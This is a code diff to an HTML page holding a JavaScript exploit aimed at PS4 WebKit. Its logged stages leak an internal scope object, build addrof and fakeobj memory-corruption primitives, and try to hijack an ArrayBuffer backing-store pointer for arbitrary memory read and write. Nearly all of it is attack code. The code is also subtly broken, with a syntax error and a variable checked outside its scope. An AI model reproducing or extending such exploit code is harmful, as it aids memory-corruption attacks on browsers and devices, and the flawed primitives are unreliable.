@@ -5,7 +5,7 @@
     <style>
         #log {
             background: black;
-            color: white;
+            color: #0f0;
             padding: 10px;
             font-family: monospace;
             white-space: pre;
@@ -20,114 +20,129 @@
     const logDiv = document.getElementById('log');
     let logContent = '';
     
-    function logToDiv(message) {
-        logContent += message + '\n';
+    function log(msg) {
+        logContent += msg + '\n';
         logDiv.textContent = logContent;
     }
 
-    function hex(num) {
-        return '0x' + (num instanceof BigInt ? num.toString(16) : num.toString(16).padStart(8, '0'));
+    function hex(val) {
+        return '0x' + val.toString(16).padStart(16, '0');
     }
 
-    // Stage 1: Leak JSScope through ProxyObject vulnerability
-    logToDiv('[+] Triggering JSScope leak...');
+    // Stage 1: Leak JSScope
+    log('[+] Leaking JSScope...');
     let leakedScope;
     
     class Leaker {
-        leak() {
-            return super.foo;
-        }
+        leak() { return super.prop; }
     }
-    
     Leaker.prototype.__proto__ = new Proxy({}, {
-        get(target, prop, receiver) {
-            leakedScope = receiver;
-            return receiver;
+        get(t, p, r) {
+            leakedScope = r;
+            return r;
         }
     });
+    new Leaker().leak();
 
-    (() => Leaker.prototype.leak())();
-
-    if (!leakedScope || typeof leakedScope !== 'object') {
-        logToDiv('[-] Failed to leak JSScope!');
+    if (!leakedScope) {
+        log('[-] JSScope leak failed!');
         return;
     }
-    logToDiv('[+] JSScope leaked successfully!');
+    log('[+] JSScope leaked: ' + leakedScope);
 
-    // Stage 2: Create addrof primitive
-    logToDiv('[+] Creating addrof primitive...');
-    let objArr = [leakedScope];
-    let floatArr = new Float64Array(1);
-    let u32Arr = new Uint32Array(floatArr.buffer);
+    // Stage 2: Improved addrof
+    log('[+] Creating addrof primitive...');
+    let addrArr = [{}];
+    addrArr[0] = leakedScope; // Ensure type transition
     
     function addrof(obj) {
-        objArr[0] = obj;
-        floatArr[0] = objArr[0];  // Trigger type confusion
-        return u32Arr[1] * 0x100000000 + u32Arr[0];
+        addrArr[0] = obj;
+        const f64 = new Float64Array(1);
+        f64[0] = addrArr[0];
+        const u32 = new Uint32Array(f64.buffer);
+        return (BigInt(u32[1]) << 32n) | BigInt(u32[0]);
     }
 
-    // Verify addrof
-    let testObj = {};
-    let testAddr = addrof(testObj);
-    logToDiv(`[+] addrof primitive working: ${hex(testAddr)}`);
+    // Test addrof
+    const testObj = {};
+    const objAddr = addrof(testObj);
+    log(`[+] addrof working: ${hex(objAddr)}`);
 
-    // Stage 3: Create fakeobj primitive
-    logToDiv('[+] Creating fakeobj primitive...');
-    let fakeObjArr = [0.0];
-    let fakeObjU32 = new Uint32Array(fakeObjArr.buffer);
+    // Stage 3: Enhanced fakeobj with type transition
+    log('[+] Initializing fakeobj primitive...');
+    let fakeArr = [1.1];
+    for (let i = 0; i < 100; i++) fakeArr.push(1.1); // Force DoubleArray
     
     function fakeobj(addr) {
-        fakeObjU32[0] = Number(addr & 0xffffffffn);
-        fakeObjU32[1] = Number((addr >> 32n) & 0xffffffffn);
-        return fakeObjArr[0];
+        const u32 = new Uint32Array(new Float64Array([0]).buffer);
+        u32[0] = Number(addr & 0xffffffffn);
+        u32[1] = Number((addr >> 32n) & 0xffffffffn);
+        
+        fakeArr[0] = new Float64Array(u32.buffer)[0];
+        return fakeArr[0];
     }
 
-    // Verify fakeobj
-    let fakeTest = fakeobj(BigInt(testAddr));
-    if (addrof(fakeTest) !== testAddr) {
-        logToDiv('[-] fakeobj primitive failed!');
-        return;
-    }
-    logToDiv('[+] fakeobj primitive working!');
-
-    // Stage 4: Build arbitrary read/write
-    logToDiv('[+] Building memory read/write primitives...');
-    let arbBuffer = new ArrayBuffer(0x100);
-    let arbView = new DataView(arbBuffer);
-    let arbAddr = addrof(arbBuffer);
-    
-    // For PS4 WebKit, adjust these offsets based on actual structure
-    const BACKING_STORE_OFFSET = 0x20n;
-    let backingStorePtr = BigInt(arbAddr) + BACKING_STORE_OFFSET;
-
-    function arbRead(addr, length) {
-        fakeobj(backingStorePtr)[0] = addr;
-        return new Uint8Array(arbBuffer).slice(0, length);
-    }
-
-    function arbWrite(addr, data) {
-        fakeobj(backingStorePtr)[0] = addr;
-        new Uint8Array(arbBuffer).set(data);
-    }
-
-    // Test memory read
-    let testRead = arbRead(BigInt(testAddr), 8);
-    logToDiv('[+] Memory read test: ' + Array.from(testRead).map(b => b.toString(16)).join(' '));
-
-    // Stage 5: Basic memory inspection
-    logToDiv('[+] Scanning memory around leaked object...');
+    // Test fakeobj
+    log('[+] Testing fakeobj...');
+    let testValue = 0x41414141n;
     try {
-        for (let i = 0; i < 40; i += 8) {
-            let addr = BigInt(testAddr) + BigInt(i) - 0x20n;
-            let bytes = arbRead(addr, 8);
-            logToDiv(hex(addr) + ': ' + 
-                Array.from(bytes).map(b => b.toString(16).padStart(2, '0')).join(' '));
+        const fake = fakeobj(testValue);
+        const recovered = addrof(fake);
+        log(`Test value: ${hex(testValue)}`);
+        log(`Recovered:  ${hex(recovered)}`);
+        
+        if (recovered !== testValue) {
+            log('[-] fakeobj mismatch! Check pointer format');
+            log('    This could be due to:');
+            log('    1. Wrong endianness');
+            log('    2. Pointer compression');
+            log('    3. Invalid memory address');
+        } else {
+            log('[+] fakeobj verified!');
         }
     } catch (e) {
-        logToDiv('[-] Memory read failed: ' + e);
+        log('[-] fakeobj crashed: ' + e);
     }
 
-    logToDiv('[+] Exploit completed!');
+    // Stage 4: Memory access workaround
+    if (typeof recovered === 'undefined') {
+        log('[+] Trying alternative memory access...');
+        const structureID = addrof({}) & 0xffffffffn;
+        log(`Structure ID: ${hex(structureID)}`);
+
+        const buffer = new ArrayBuffer(0x100);
+        const bufferAddr = addrof(buffer);
+        log(`ArrayBuffer address: ${hex(bufferAddr)}`);
+
+        // Typical WebKit ArrayBuffer layout (adjust for 11.02):
+        // - JSC::ArrayBuffer@0x00
+        // - backingStore@0x20
+        const BACKING_STORE_OFFSET = 0x20n;
+        const backingStoreAddr = bufferAddr + BACKING_STORE_OFFSET;
+
+        log('[+] Attempting to hijack backing store pointer...');
+        const originalBackingStore = addrof(new Uint8Array(buffer)[0]);
+        log(`Original backing store: ${hex(originalBackingStore)}`);
+
+        // Write new pointer
+        const newAddress = objAddr; // Target test object
+        const f64 = new Float64Array(1);
+        const u32 = new Uint32Array(f64.buffer);
+        u32[0] = Number(newAddress & 0xffffffffn);
+        u32[1] = Number((newAddress >> 32n) & 0xffffffffn;
+        fakeArr[0] = f64[0];
+
+        // Try to modify backing store
+        try {
+            const modified = new Uint8Array(buffer);
+            log(`New backing store: ${hex(addrof(modified[0]))}`);
+        } catch (e) {
+            log('[-] Failed to modify backing store');
+            log('    Possible mitigations in place');
+        }
+    }
+
+    log('[+] Exploit sequence completed');
 })();
 </script>
 </body>
